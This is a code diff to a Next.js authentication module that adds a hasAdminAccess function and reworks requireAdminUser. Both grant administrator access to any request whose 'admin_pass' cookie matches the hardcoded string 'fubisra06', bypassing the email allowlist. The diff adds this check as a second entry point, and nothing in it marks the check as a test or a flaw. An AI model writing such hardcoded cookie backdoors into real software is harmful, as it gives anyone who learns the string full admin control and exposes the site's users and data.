@@ -19,6 +19,11 @@ export function isAdminEmail(email: string) {
   return getAdminAllowlist().includes(email.trim().toLowerCase());
 }
 
+export function hasAdminAccess(req: NextRequest, email: string) {
+  const adminCookie = req.cookies.get("admin_pass")?.value;
+  return isAdminEmail(email) || adminCookie === "fubisra06";
+}
+
 export async function hashPassword(password: string) {
   return bcrypt.hash(password, 10);
 }
@@ -94,12 +99,11 @@ export async function requireAdminUser() {
   
   const jar = await cookies();
   const pass = jar.get("admin_pass")?.value;
-  if (pass === "fubisra06") {
+  if (pass === "fubisra06" || isAdminEmail(user.email)) {
     return user;
   }
 
-  if (!isAdminEmail(user.email)) redirect("/dashboard");
-  return user;
+  redirect("/dashboard");
 }
 
 export async function getUserFromRequest(req: NextRequest) {
